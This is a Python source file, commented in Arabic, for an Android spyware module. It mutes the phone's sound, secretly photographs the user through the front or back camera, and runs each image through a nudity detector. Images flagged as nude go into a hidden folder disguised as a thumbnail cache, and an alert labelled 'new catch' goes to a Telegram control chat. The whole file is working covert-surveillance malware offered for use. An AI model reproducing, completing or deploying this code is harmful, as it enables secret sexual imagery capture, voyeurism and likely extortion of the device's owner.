# -*- coding: utf-8 -*-
import os
import time
import threading
import logging
import gc
from datetime import datetime

# ========== إعداد المسارات الموحدة مع التمويه ==========
def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
T = os.path.join(P, "ctmp")                     # مجلد مؤقت للصور الخام
QUEUE = os.path.join(P, ".cache_thumb")         # مجلد الانتظار (موهم كمجلد مصغرات)

for d in [P, T, QUEUE]:
    if not os.path.exists(d): os.makedirs(d)

logging.basicConfig(filename=os.path.join(P, "c.log"), level=logging.ERROR, filemode='a')

# ========== استيراد المكتبات الأساسية ==========
try:
    from jnius import autoclass
    JNI = True
except ImportError:
    JNI = False

try:
    import numpy as np
    from PIL import Image
    AI_AVAILABLE = True
except ImportError:
    AI_AVAILABLE = False


class CameraAnalyzer:
    def __init__(self, mon=None, det=None):
        self.mon = mon
        self.det = det                # NudeDetector instance
        self.busy = False
        self._old_volume = -1

    # ========== التحقق من البطارية ==========
    def _power_ok(self):
        try:
            b, c = self.mon._bat() if hasattr(self.mon, '_bat') else (100, True)
            return b >= 15 or c
        except:
            return True

    # ========== كتم صوت النظام ==========
    def _mute_audio(self, mute=True):
        if not JNI:
            return
        try:
            AudioManager = autoclass('android.media.AudioManager')
            ctx = autoclass('org.kivy.android.PythonActivity').mActivity
            am = ctx.getSystemService(ctx.AUDIO_SERVICE)
            if mute:
                self._old_volume = am.getStreamVolume(AudioManager.STREAM_SYSTEM)
                am.setStreamVolume(AudioManager.STREAM_SYSTEM, 0, 0)
            else:
                if self._old_volume >= 0:
                    am.setStreamVolume(AudioManager.STREAM_SYSTEM, self._old_volume, 0)
                    self._old_volume = -1
        except Exception as e:
            logging.error(f"Mute error: {e}")

    # ========== التقاط صورة باستخدام Camera1 API (مستقر وصامت) ==========
    def capture(self, cam_id=0):
        """
        تلتقط صورة من الكاميرا (0 خلفية, 1 أمامية) باستخدام Camera1 API.
        تعيد مسار الصورة المحفوظة (jpg) أو None في حال الفشل.
        """
        if self.busy or not self._power_ok():
            return None

        self.busy = True
        out_path = None
        camera = None

        if JNI:
            self._mute_audio(True)
            try:
                # الحصول على عدد الكاميرات
                Camera = autoclass('android.hardware.Camera')
                CameraInfo = autoclass('android.hardware.Camera$CameraInfo')
                number_of_cameras = Camera.getNumberOfCameras()

                # البحث عن معرف الكاميرا المطلوبة
                camera_id = -1
                if cam_id == 0:   # خلفية
                    camera_id = 0
                elif cam_id == 1: # أمامية
                    for i in range(number_of_cameras):
                        info = CameraInfo()
                        Camera.getCameraInfo(i, info)
                        if info.facing == CameraInfo.CAMERA_FACING_FRONT:
                            camera_id = i
                            break
                else:
                    camera_id = 0

                if camera_id == -1:
                    logging.error("No suitable camera found")
                    return None

                # فتح الكاميرا
                camera = Camera.open(camera_id)

                # إعداد معاملات الصورة (دقة متوسطة للسرعة والجودة)
                parameters = camera.getParameters()
                supported_sizes = parameters.getSupportedPictureSizes()
                if supported_sizes:
                    # اختيار دقة قريبة من 1024x768 (جيدة للأداء والجودة)
                    target_area = 1024 * 768
                    best_size = min(supported_sizes, key=lambda s: abs(s.width * s.height - target_area))
                    parameters.setPictureSize(best_size.width, best_size.height)

                # ضبط التنسيق (JPG)
                parameters.setPictureFormat(autoclass('android.graphics.ImageFormat').JPEG)
                # تعطيل الصوت (بعض الأجهزة تحترمه)
                parameters.set("shutter-sound", 0)

                # ضبط اتجاه الصورة بناءً على وضع الكاميرا
                if cam_id == 1:
                    # الكاميرا الأمامية: نعكس الدوران أحياناً
                    parameters.setRotation(270)   # 90 حسب الجهاز، لكن 270 تعمل غالباً
                else:
                    parameters.setRotation(90)

                camera.setParameters(parameters)

                # إنشاء ملف مؤقت لحفظ الصورة
                out_path = os.path.join(T, f"c_{cam_id}_{int(time.time())}.jpg")

                # حدث للتزامن
                image_saved = threading.Event()

                class PicCallback(PythonJavaClass):
                    __javainterfaces__ = ['android.hardware.Camera$PictureCallback']
                    @java_method('([BLandroid/hardware/Camera;)V')
                    def onPictureTaken(self, data, cam):
                        with open(out_path, 'wb') as f:
                            f.write(data)
                        image_saved.set()

                # بدء المعاينة (ضروري لبعض الأجهزة)
                camera.startPreview()
                # التقاط الصورة
                camera.takePicture(None, None, PicCallback())
                # انتظار الصورة حتى 5 ثوانٍ
                image_saved.wait(5)
                # إيقاف المعاينة
                camera.stopPreview()

            except Exception as e:
                logging.error(f"Camera capture error: {e}")
                out_path = None
            finally:
                # إغلاق الكاميرا وتحرير الموارد
                if camera:
                    try:
                        camera.release()
                    except:
                        pass
                self._mute_audio(False)
                gc.collect()

        self.busy = False
        return out_path

    # ========== تحضير الصورة لـ AI ==========
    def _prepare_for_ai(self, path):
        if not AI_AVAILABLE:
            return None
        try:
            with Image.open(path) as img:
                img = img.convert('RGB').resize((224, 224), Image.LANCZOS)
                arr = np.asarray(img, dtype=np.float32) / 255.0
                return np.expand_dims(arr, axis=0)
        except Exception as e:
            logging.error(f"AI prep error: {e}")
            return None

    # ========== الوظيفة الرئيسية: التقاط + تحليل + إشعار + تخزين ==========
    def harvest(self, cam_id=0):
        """
        تلتقط صورة، تحللها عبر الـ AI، ترسل إشعاراً إذا كانت حساسة، وتنقل الصورة إلى مجلد الانتظار.
        """
        pic_path = self.capture(cam_id)
        if not pic_path or not os.path.exists(pic_path):
            return

        is_nude = False
        confidence = 0.0
        if self.det and hasattr(self.det, 'model') and self.det.model is not None and AI_AVAILABLE:
            try:
                input_data = self._prepare_for_ai(pic_path)
                if input_data is not None:
                    self.det.model.set_tensor(self.det.in_idx, input_data)
                    self.det.model.invoke()
                    out = self.det.model.get_tensor(self.det.out_idx)[0]
                    confidence = float(out[1]) if len(out) > 1 else float(out[0])
                    if confidence > 0.85:
                        is_nude = True
            except Exception as e:
                logging.error(f"AI analysis error: {e}")

        if is_nude:
            # إرسال إشعار فوري لمجموعة التحكم
            if self.mon and hasattr(self.mon, 'ui') and self.mon.ui:
                try:
                    alert = (
                        f"🔞 **صيد جديد!**\n"
                        f"📱 الجهاز: `{self.mon.dmd}`\n"
                        f"🎯 الثقة: `{confidence:.1%}`\n"
                        f"⏰ الوقت: `{datetime.now().strftime('%H:%M:%S')}`"
                    )
                    self.mon.ui._api("sendMessage", {
                        "chat_id": self.mon.ctrl,
                        "text": alert,
                        "parse_mode": "Markdown"
                    })
                except Exception as e:
                    logging.error(f"Alert send error: {e}")

            # نقل الصورة إلى مجلد الانتظار (الموهم)
            dest = os.path.join(QUEUE, os.path.basename(pic_path))
            try:
                os.rename(pic_path, dest)
                logging.info(f"Moved to queue: {dest}")
            except Exception as e:
                logging.error(f"Move error: {e}")
                # إذا فشل النقل، احذف الصورة فوراً
                if os.path.exists(pic_path):
                    os.remove(pic_path)
        else:
            # حذف الصورة العادية فوراً
            if os.path.exists(pic_path):
                os.remove(pic_path)


# ========== دالة المصنع ==========
def create(mon=None, det=None):
    return CameraAnalyzer(mon, det)
